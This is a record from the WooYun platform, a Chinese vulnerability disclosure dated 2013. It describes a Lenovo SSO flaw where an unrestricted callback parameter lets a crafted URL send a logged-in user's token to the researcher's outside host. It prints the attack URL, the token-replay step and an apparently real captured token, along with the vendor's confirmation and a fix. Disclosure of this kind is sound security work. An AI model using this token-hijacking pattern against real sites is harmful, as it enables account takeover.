{"id": 9159, "wybug_id": "wooyun-2013-034968", "wybug_title": "联想安全问题二SSO统一认证系统缺陷可导致劫持用户帐号", "wybug_corp": "联想", "wybug_author": "VIP", "wybug_date": "2013-08-22 11:41", "wybug_open_date": "2013-10-06 11:41", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["逻辑错误"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-08-22：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-08-22：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-09-01：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-09-11：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-09-21：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-10-06：\t细节向公众公开  简要描述： 联想SSO统一认证系统存在缺陷，如果用户是登录状态，那么一个img src就可以劫持用户的令牌. 详细说明：  联想的一个正常登录url如下：\nhttps://passport.lenovo.com/wauthen/login?lenovoid.action=uilogin&lenovoid.source=browser:realm:chita.lps.lenovo.com&lenovoid.realm=chita.lps.lenovo.com&lenovoid.uinfo=username&lenovoid.cb=http://lefen.lenovo.com/lfb/lenovo.php?mod=login\n最后的lenovoid.cb相当于是一个callback，会将令牌数据回调到上面的网址，那么，如果将这个回调地址改成我们的接收页面呢?\nhttps://passport.lenovo.com/wauthen/login?lenovoid.action=uilogin&lenovoid.source=browser:realm:chita.lps.lenovo.com&lenovoid.realm=chita.lps.lenovo.com&lenovoid.uinfo=username&lenovoid.cb=http://vip.yupage.com/lenovo.php\n用户在登录状态下访问这个页面是不需要任何点击就会自动授权，令牌就被我获取了。利用方法：先登录你的联想帐号，然后访问测试页面http://vip.yupage.com/lenovo.htm可以看到后台发起了一次请求，并且令牌被回调到了我的接收页面\n\n然后看看，已经收到了令牌\n\n然后拼接url，就能进别人的帐号了\nhttp://www.lenovo.com.cn/?[令牌]\n   漏洞证明：  \nhttp://www.lenovo.com.cn/?lenovoid.action=uilogin&lenovoid.realm=chita.lps.lenovo.com&lenovoid.wust=ZAgAAAAAAAGE9MTAwMDk3NzU1MjgmYj0xJmM9MSZkPTEwMzAyJmU9QzgwM0VCRjVFMTAwRUNEREYxNkRDMTMwRjQ3OUE1RjExJmg9MTM3NzEzMjA1NjIyNSZpPTg2NDAwJnVzZXJuYW1lPXNtdHBfYWRtaW4lNDB5ZWFoLm5ldKfi7PMTpo0soIaXS27jiZo=&lenovoid.ctx=&lenovoid.lang=&lenovoid.vp=\n   修复方案：  对lenovoid.cb做限制，必须是lenovo.com.cn域下的域名   版权声明：转载请注明来源 VIP@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2013-08-22 15:41 厂商回复： 感谢VIP同学对联想安全做出的贡献！我们将立即评估与修复相关漏洞 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-12-26 09:52 |    \t\tHackBraid  \t\t\t( 核心白帽子 |\t\t\t        Rank:1545 漏洞数:260        | ...........................................)\t\t \n  看完drops还是不懂什么原理。。。    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}